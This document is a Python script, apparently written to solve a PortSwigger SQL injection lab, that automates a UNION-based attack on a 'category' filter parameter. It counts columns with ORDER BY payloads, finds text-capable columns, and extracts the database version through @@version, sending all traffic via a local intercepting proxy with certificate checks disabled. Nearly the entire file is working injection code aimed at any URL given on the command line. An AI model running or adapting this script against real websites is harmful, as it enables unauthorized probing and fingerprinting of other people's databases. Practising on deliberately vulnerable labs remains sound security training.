#problem statement -> SQL injection attack, querying the database type and version on MySQL and Microsoft


import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
from colorama import Fore , Back , Style , init

#Defining colors
#init(autoreset=True)
magenta = Fore.MAGENTA
bright = Style.BRIGHT
reset = Style.RESET_ALL
print(bright,magenta)


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

def numberof_column(url):
    path="filter?category=Gifts"
    for i in range(1,50):
        payload = "'order+by+{}%23".format(i)  # -- this is ban thatswhy using # url encoded version of hash is %23
        res = requests.get(url=url+path+payload,proxies=proxies,verify=False)
        if res.status_code != 200:
            print("There are {} columns".format(i-1))
            return i-1
    
    return False

def columnof_str_datatype(url,ncolumn):
    column_list = []
    path = "filter?category=Gifts"
    for i in range(1,ncolumn+1):
        payload_list = ['null']*ncolumn
        payload_list[i-1] = "'a'"
        payload = "'union+select+"+",+".join(payload_list)+"%23"
        res = requests.get(url=url+path+payload,proxies=proxies,verify=False)
        if res.status_code == 200:
            column_list.append(i)
    return column_list

def get_version(url,ncolumn,lcolumn):
    path = "filter?category=Gifts"
    for i in range(1,ncolumn+1):
        payload_list = ['null']*ncolumn
        payload_list[i-1] = '@@version'
        payload = "'union+select+"+",+".join(payload_list)+"%23"
        if i in lcolumn:
            print("[+] Dumping version of Database.....")
            res = requests.get(url+path+payload,proxies=proxies,verify=False)
            if res.status_code == 200:
                soup = BeautifulSoup(res.text,'html.parser')
                version = soup.find(string=re.compile(".*\d{1,2}\.\d{1,2}\.\d{1,2}.*"))
                return version
    return False
if __name__=="__main__":
    try:
        url = sys.argv[1]
    except IndexError:
        print("[-] Usage : python3 {} <url>".format(sys.argv[0]))
        print("[-] Example : python3 {} https://portswigger.net".format(sys.argv[0]))
        sys.exit(-1)

    print("[+] Figuring number of columns....")
    ncolumn = numberof_column(url)
    lcolumn = columnof_str_datatype(url,ncolumn)
    print(lcolumn)
    version = get_version(url,ncolumn,lcolumn)
    print("version = ",version)


print(reset)